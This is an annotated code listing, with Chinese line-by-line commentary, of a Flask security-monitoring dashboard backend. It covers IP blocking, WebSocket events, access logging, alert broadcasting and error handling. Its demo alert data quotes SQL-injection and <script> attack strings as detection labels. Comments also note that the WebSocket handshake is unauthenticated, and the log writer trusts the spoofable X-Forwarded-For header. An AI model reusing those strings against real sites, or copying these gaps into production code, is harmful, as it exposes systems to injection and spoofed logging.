| 2184 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 2185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ok": True,` |
| 2186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "command": raw,` |
| 2187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "output": (` |
| 2188 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"banned_ips={b_count}, "` |
| 2189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"threats={t_count}, "` |
| 2190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"score={_compute_security_score_db()}"` |
| 2191 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 2192 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 2193 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2194 | 条件判断：满足条件时进入对应分支。 | `    if not validate_ip(arg):` |
| 2195 | 返回结果：把处理后的值交回调用方。 | `        return {"ok": False, "command": raw, "output": f"无效 IP: {arg!r}"}` |
| 2196 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2197 | 条件判断：满足条件时进入对应分支。 | `    if action == "block":` |
| 2198 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _persist_banned_ip(arg, "command panel", operator="command_panel")` |
| 2199 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _sync_banned_cache_from_db(state)` |
| 2200 | 返回结果：把处理后的值交回调用方。 | `        return {"ok": True, "command": raw, "output": f"已加入封禁列表: {arg}"}` |
| 2201 | 条件判断：满足条件时进入对应分支。 | `    if action == "unblock":` |
| 2202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        removed = _delete_banned_ip_persistent(arg)` |
| 2203 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _sync_banned_cache_from_db(state)` |
| 2204 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 2205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ok": removed,` |
| 2206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "command": raw,` |
| 2207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "output": f"{'已解封' if removed else 'IP 不在封禁列表中'}: {arg}",` |
| 2208 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 2209 | 条件判断：满足条件时进入对应分支。 | `    if action == "rate-limit":` |
| 2210 | 返回结果：把处理后的值交回调用方。 | `        return {"ok": True, "command": raw, "output": f"已对 {arg} 打开限速策略（示例）"}` |
| 2211 | 条件判断：满足条件时进入对应分支。 | `    if action == "isolate":` |
| 2212 | 返回结果：把处理后的值交回调用方。 | `        return {"ok": True, "command": raw, "output": f"CRITICAL：建议隔离主机 {arg}"}` |
| 2213 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2214 | 返回结果：把处理后的值交回调用方。 | `    return {"ok": False, "command": raw, "output": "未知命令"}` |
| 2215 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2216 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2217 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2218 | 注释：解释下面或当前这段代码的设计意图。 | `# WebSocket` |
| 2219 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2220 | 函数定义：声明 `_register_socket_handlers` 的输入、处理逻辑和返回结果。 | `def _register_socket_handlers(socketio: SocketIO, state: _ServerState) -> None:` |
| 2221 | WebSocket 装饰器：把下面的函数绑定到实时通信事件。 | `    @socketio.on("connect")` |
| 2222 | 函数定义：声明 `_on_connect` 的输入、处理逻辑和返回结果。 | `    def _on_connect():  # type: ignore[unused-function]` |
| 2223 | 注释：解释下面或当前这段代码的设计意图。 | `        # Phase 7 暂不在 WebSocket 握手阶段强制 JWT（浏览器首次连接尚未携带 header）；` |
| 2224 | 注释：解释下面或当前这段代码的设计意图。 | `        # 业务数据本身仅通过受保护 REST 获取，WebSocket 仅用于广播非敏感事件。` |
| 2225 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[WebSocket] 客户端已连接")` |
| 2226 | 函数调用：执行已有函数/方法完成当前步骤。 | `        socketio.emit("metrics_update", state.stats)` |
| 2227 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2228 | WebSocket 装饰器：把下面的函数绑定到实时通信事件。 | `    @socketio.on("disconnect")` |
| 2229 | 函数定义：声明 `_on_disconnect` 的输入、处理逻辑和返回结果。 | `    def _on_disconnect():  # type: ignore[unused-function]` |
| 2230 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[WebSocket] 客户端已断开")` |
| 2231 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2232 | WebSocket 装饰器：把下面的函数绑定到实时通信事件。 | `    @socketio.on("ping_client")` |
| 2233 | 函数定义：声明 `_on_ping` 的输入、处理逻辑和返回结果。 | `    def _on_ping(data: Any):  # type: ignore[unused-function]` |
| 2234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        socketio.emit("pong_client", {"echo": data, "ts": _now_iso()})` |
| 2235 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2236 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2237 | 函数定义：声明 `_register_access_log_writer` 的输入、处理逻辑和返回结果。 | `def _register_access_log_writer(app: Flask) -> None:` |
| 2238 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Optionally emit Apache/Nginx-compatible access logs for main.py ingestion."""` |
| 2239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    enabled = os.environ.get("FLASK_ACCESS_LOG_ENABLED", "").lower() == "true"` |
| 2240 | 条件判断：满足条件时进入对应分支。 | `    if not enabled:` |
| 2241 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 2242 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    log_path = os.environ.get("FLASK_ACCESS_LOG_PATH", "logs/access.log")` |
| 2244 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2245 | 函数定义：声明 `_escape_log_value` 的输入、处理逻辑和返回结果。 | `    def _escape_log_value(value: str) -> str:` |
| 2246 | 返回结果：把处理后的值交回调用方。 | `        return value.replace("\\", "\\\\").replace('"', '\\"')` |
| 2247 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2248 | 装饰器：为下面的函数或类附加框架行为。 | `    @app.after_request` |
| 2249 | 函数定义：声明 `_write_access_log` 的输入、处理逻辑和返回结果。 | `    def _write_access_log(response):  # type: ignore[unused-function]` |
| 2250 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 2251 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `            full_path = request.full_path.rstrip("?") or request.path` |
| 2252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            client_ip = (` |
| 2253 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `                request.headers.get("X-Forwarded-For", request.remote_addr or "-")` |
| 2254 | 函数调用：执行已有函数/方法完成当前步骤。 | `                .split(",", 1)[0]` |
| 2255 | 函数调用：执行已有函数/方法完成当前步骤。 | `                .strip()` |
| 2256 | 代码语句：参与当前文件的业务流程或数据处理。 | `                or "-"` |
| 2257 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            timestamp = datetime.now(timezone.utc).astimezone().strftime(` |
| 2259 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "%d/%b/%Y:%H:%M:%S %z"` |
| 2260 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            size = response.calculate_content_length()` |
| 2262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            line = (` |
| 2263 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f'{client_ip} - - [{timestamp}] '` |
| 2264 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `                f'"{request.method} {_escape_log_value(full_path)} HTTP/{request.environ.get("SERVER_PROTOCOL", "HTTP/1.1").split("/", 1)[-1]}" '` |
| 2265 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f'{response.status_code} {size if size is not None else "-"} '` |
| 2266 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `                f'"{_escape_log_value(request.referrer or "-")}" '` |
| 2267 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `                f'"{_escape_log_value(request.user_agent.string or "-")}"'` |
| 2268 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            path = os.path.abspath(log_path)` |
| 2270 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.makedirs(os.path.dirname(path), exist_ok=True)` |
| 2271 | 上下文管理：自动管理资源打开与释放。 | `            with open(path, "a", encoding="utf-8") as f:` |
| 2272 | 函数调用：执行已有函数/方法完成当前步骤。 | `                f.write(line + "\n")` |
| 2273 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 2274 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("access log write failed", exc_info=True)` |
| 2275 | 返回结果：把处理后的值交回调用方。 | `        return response` |
| 2276 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2277 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2278 | 函数定义：声明 `push_alert` 的输入、处理逻辑和返回结果。 | `def push_alert(app: Flask, alert: Dict[str, Any]) -> Dict[str, Any]:` |
| 2279 | 文档字符串：说明当前模块、类或函数的职责。 | `    """供后端检测/响应流水线调用：先入库再广播（与 Stream consumer 语义一致）。` |
| 2280 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2281 | 代码语句：参与当前文件的业务流程或数据处理。 | `    事件名统一为 \`alert\`（对齐 DESIGN §8.2 与 Phase 7 前端提示词）。` |
| 2282 | 代码语句：参与当前文件的业务流程或数据处理。 | `    仅当数据库写入成功时才更新内存缓存并 \`\`Socket.IO\`\` 广播；失败时返回空 dict。` |
| 2283 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 2284 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state: _ServerState = app.extensions["guardian_state"]` |
| 2285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sio: SocketIO = app.extensions["guardian_socketio"]` |
| 2286 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pre: Dict[str, Any] = dict(alert)` |
| 2287 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pre.setdefault("id", _uuid())` |
| 2288 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pre.setdefault("timestamp", _now_iso())` |
| 2289 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    level = pre.get("level")` |
| 2290 | 条件判断：满足条件时进入对应分支。 | `    if level not in ALERT_LEVELS:` |
| 2291 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pre["level"] = "low"` |
| 2292 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status = pre.get("status")` |
| 2293 | 条件判断：满足条件时进入对应分支。 | `    if status not in ALERT_STATUSES:` |
| 2294 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pre["status"] = "open"` |
| 2295 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pre.setdefault("threat_type", "unknown")` |
| 2296 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pre["source_ip"] = str(pre.get("source_ip") or "").strip()` |
| 2297 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pre.setdefault("title", pre.get("details") or pre.get("message") or "未分类告警")` |
| 2298 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pre.setdefault("summary", pre.get("title"))` |
| 2299 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pre.setdefault("history", [{"status": pre["status"], "timestamp": pre["timestamp"]}])` |
| 2300 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2301 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 2302 | 上下文管理：自动管理资源打开与释放。 | `        with app.app_context():` |
| 2303 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = _upsert_alert_to_db(pre)` |
| 2304 | 条件判断：满足条件时进入对应分支。 | `            if row is None:` |
| 2305 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                api_dict = None` |
| 2306 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 2307 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                api_dict = _alert_to_api_dict(row)` |
| 2308 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 2309 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.exception("[Alert] 告警入库失败，跳过 Socket 广播")` |
| 2310 | 返回结果：把处理后的值交回调用方。 | `        return {}` |
| 2311 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2312 | 条件判断：满足条件时进入对应分支。 | `    if not api_dict:` |
| 2313 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[Alert] 入库跳过（缺少 id）")` |
| 2314 | 返回结果：把处理后的值交回调用方。 | `        return {}` |
| 2315 | 函数调用：执行已有函数/方法完成当前步骤。 | `    state.add_alert(api_dict)` |
| 2316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state.stats["total_threats"] = state.stats.get("total_threats", 0) + 1` |
| 2317 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 2318 | 函数调用：执行已有函数/方法完成当前步骤。 | `        sio.emit("alert", api_dict)` |
| 2319 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 2320 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.debug("[Alert] Socket emit 失败", exc_info=True)` |
| 2321 | 返回结果：把处理后的值交回调用方。 | `    return api_dict` |
| 2322 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2323 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2324 | 函数定义：声明 `push_metrics` 的输入、处理逻辑和返回结果。 | `def push_metrics(app: Flask, metrics: Dict[str, Any]) -> None:` |
| 2325 | 文档字符串：说明当前模块、类或函数的职责。 | `    """广播指标更新，触发前端卡片/图表刷新。"""` |
| 2326 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state: _ServerState = app.extensions["guardian_state"]` |
| 2327 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sio: SocketIO = app.extensions["guardian_socketio"]` |
| 2328 | 函数调用：执行已有函数/方法完成当前步骤。 | `    state.stats.update(metrics)` |
| 2329 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state.stats["updated_at"] = _now_iso()` |
| 2330 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sio.emit("metrics_update", state.stats)` |
| 2331 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2332 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2333 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2334 | 注释：解释下面或当前这段代码的设计意图。 | `# 错误处理` |
| 2335 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2336 | 函数定义：声明 `_register_jwt_error_handlers` 的输入、处理逻辑和返回结果。 | `def _register_jwt_error_handlers(jwt: JWTManager) -> None:` |
| 2337 | 装饰器：为下面的函数或类附加框架行为。 | `    @jwt.unauthorized_loader` |
| 2338 | 函数定义：声明 `_missing` 的输入、处理逻辑和返回结果。 | `    def _missing(reason: str):  # type: ignore[unused-function]` |
| 2339 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body = _error_payload(code="jwt_missing", message="缺少有效 JWT")` |
| 2340 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body["reason"] = reason` |
| 2341 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(body), 401` |
| 2342 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2343 | 装饰器：为下面的函数或类附加框架行为。 | `    @jwt.invalid_token_loader` |
| 2344 | 函数定义：声明 `_invalid` 的输入、处理逻辑和返回结果。 | `    def _invalid(reason: str):  # type: ignore[unused-function]` |
| 2345 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body = _error_payload(code="jwt_invalid", message="JWT 无效")` |
| 2346 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body["reason"] = reason` |
| 2347 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(body), 401` |
| 2348 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2349 | 装饰器：为下面的函数或类附加框架行为。 | `    @jwt.expired_token_loader` |
| 2350 | 函数定义：声明 `_expired` 的输入、处理逻辑和返回结果。 | `    def _expired(jwt_header, jwt_payload):  # type: ignore[unused-function]` |
| 2351 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_error_payload(code="jwt_expired", message="JWT 已过期")), 401` |
| 2352 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2353 | 装饰器：为下面的函数或类附加框架行为。 | `    @jwt.revoked_token_loader` |
| 2354 | 函数定义：声明 `_revoked` 的输入、处理逻辑和返回结果。 | `    def _revoked(jwt_header, jwt_payload):  # type: ignore[unused-function]` |
| 2355 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_error_payload(code="jwt_revoked", message="JWT 已被吊销")), 401` |
| 2356 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2357 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2358 | 函数定义：声明 `_register_common_error_handlers` 的输入、处理逻辑和返回结果。 | `def _register_common_error_handlers(app: Flask) -> None:` |
| 2359 | 装饰器：为下面的函数或类附加框架行为。 | `    @app.errorhandler(429)` |
| 2360 | 函数定义：声明 `_rate_limit` 的输入、处理逻辑和返回结果。 | `    def _rate_limit(err):  # type: ignore[unused-function]` |
| 2361 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body = _error_payload(` |
| 2362 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            code="rate_limited",` |
| 2363 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            message="请求过于频繁，已触发限流",` |
| 2364 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 2365 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body["retry_after"] = getattr(err, "description", None)` |
| 2366 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 2367 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(body),` |
| 2368 | 代码语句：参与当前文件的业务流程或数据处理。 | `            429,` |
| 2369 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 2370 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2371 | 装饰器：为下面的函数或类附加框架行为。 | `    @app.errorhandler(403)` |
| 2372 | 函数定义：声明 `_forbidden` 的输入、处理逻辑和返回结果。 | `    def _forbidden(err):  # type: ignore[unused-function]` |
| 2373 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_error_payload(code="forbidden", message="无权限访问")), 403` |
| 2374 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2375 | 装饰器：为下面的函数或类附加框架行为。 | `    @app.errorhandler(404)` |
| 2376 | 函数定义：声明 `_not_found` 的输入、处理逻辑和返回结果。 | `    def _not_found(err):  # type: ignore[unused-function]` |
| 2377 | 注释：解释下面或当前这段代码的设计意图。 | `        # 仅对 /api/* 返回 JSON；页面请求让 Flask 走默认模板/重定向` |
| 2378 | 条件判断：满足条件时进入对应分支。 | `        if request.path.startswith("/api/"):` |
| 2379 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2380 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 2381 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _error_payload(code="not_found", message="资源不存在")` |
| 2382 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 2383 | 代码语句：参与当前文件的业务流程或数据处理。 | `                404,` |
| 2384 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2385 | 返回结果：把处理后的值交回调用方。 | `        return redirect(url_for("page_dashboard"))` |
| 2386 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2387 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2388 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2389 | 注释：解释下面或当前这段代码的设计意图。 | `# 小工具` |
| 2390 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2391 | 函数定义：声明 `_now_iso` 的输入、处理逻辑和返回结果。 | `def _now_iso() -> str:` |
| 2392 | 返回结果：把处理后的值交回调用方。 | `    return datetime.now(timezone.utc).astimezone().isoformat(timespec="seconds")` |
| 2393 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2394 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2395 | 函数定义：声明 `_error_payload` 的输入、处理逻辑和返回结果。 | `def _error_payload(` |
| 2396 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 2397 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    code: str,` |
| 2398 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    message: str,` |
| 2399 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, Any]:` |
| 2400 | 文档字符串：说明当前模块、类或函数的职责。 | `    """统一错误体；保留 \`error\` 字段兼容已有前端分支。"""` |
| 2401 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 2402 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "error": message,` |
| 2403 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "code": code,` |
| 2404 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "message": message,` |
| 2405 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 2406 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2407 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2408 | 函数定义：声明 `_parse_iso` 的输入、处理逻辑和返回结果。 | `def _parse_iso(value: Optional[str]) -> Optional[datetime]:` |
| 2409 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 2410 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 2411 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 2412 | 返回结果：把处理后的值交回调用方。 | `        return datetime.fromisoformat(value.replace("Z", "+00:00"))` |
| 2413 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except ValueError:` |
| 2414 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 2415 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2416 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2417 | 函数定义：声明 `_safe_int` 的输入、处理逻辑和返回结果。 | `def _safe_int(` |
| 2418 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value: Optional[str],` |
| 2419 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    default: int,` |
| 2420 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    max_value: int,` |
| 2421 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 2422 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    allow_zero: bool = False,` |
| 2423 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> int:` |
| 2424 | 条件判断：满足条件时进入对应分支。 | `    if value is None:` |
| 2425 | 返回结果：把处理后的值交回调用方。 | `        return default` |
| 2426 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 2427 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        v = int(value)` |
| 2428 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except (TypeError, ValueError):` |
| 2429 | 返回结果：把处理后的值交回调用方。 | `        return default` |
| 2430 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    lower = 0 if allow_zero else 1` |
| 2431 | 返回结果：把处理后的值交回调用方。 | `    return max(lower, min(v, max_value))` |
| 2432 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2433 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2434 | 函数定义：声明 `_uuid` 的输入、处理逻辑和返回结果。 | `def _uuid() -> str:` |
| 2435 | 返回结果：把处理后的值交回调用方。 | `    return uuid.uuid4().hex` |
| 2436 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2437 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2438 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2439 | 注释：解释下面或当前这段代码的设计意图。 | `# 仅开发环境：生成演示告警（便于 UI review，生产环境已在路由层拒绝）` |
| 2440 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2441 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DEMO_TYPES: Tuple[Tuple[str, str, str], ...] = (` |
| 2442 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("port_scan", "端口扫描", "连接速率异常，疑似全端口扫描"),` |
| 2443 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("sql_injection", "SQL 注入尝试", "请求体命中 ' OR 1=1 -- 特征"),` |
| 2444 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("xss", "XSS 注入", "请求参数包含未转义 <script> 标签"),` |
| 2445 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("brute_force", "暴力破解", "登录端口 1 分钟内 200 次失败尝试"),` |
| 2446 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("dos", "DoS 流量异常", "单 IP SYN flood 超阈值"),` |
| 2447 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("malware_c2", "C2 回连", "目的域命中威胁情报 IOC"),` |
| 2448 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("credential_stuff", "凭据填充", "多账户短时高失败率"),` |
| 2449 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("unknown", "模型异常检测", "聚类偏离正常流量基线"),` |
| 2450 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 2451 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2452 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DEMO_LEVELS: Tuple[Tuple[str, float], ...] = (` |
| 2453 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("low", 0.35),` |
| 2454 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("medium", 0.30),` |
| 2455 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("high", 0.20),` |
| 2456 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("critical", 0.15),` |
| 2457 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 2458 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2459 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DEMO_PROTOCOLS: Tuple[str, ...] = ("TCP", "UDP", "HTTP", "HTTPS", "DNS")` |
| 2460 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2461 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2462 | 函数定义：声明 `_weighted_choice` 的输入、处理逻辑和返回结果。 | `def _weighted_choice(pairs: Iterable[Tuple[str, float]], rng: random.Random) -> str:` |
| 2463 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    items = list(pairs)` |
| 2464 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = rng.random()` |
| 2465 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    acc = 0.0` |
| 2466 | 循环：逐个处理集合或迭代器中的元素。 | `    for key, weight in items:` |
| 2467 | 代码语句：参与当前文件的业务流程或数据处理。 | `        acc += weight` |
| 2468 | 条件判断：满足条件时进入对应分支。 | `        if r <= acc:` |
| 2469 | 返回结果：把处理后的值交回调用方。 | `            return key` |
| 2470 | 返回结果：把处理后的值交回调用方。 | `    return items[-1][0]` |
| 2471 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2472 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
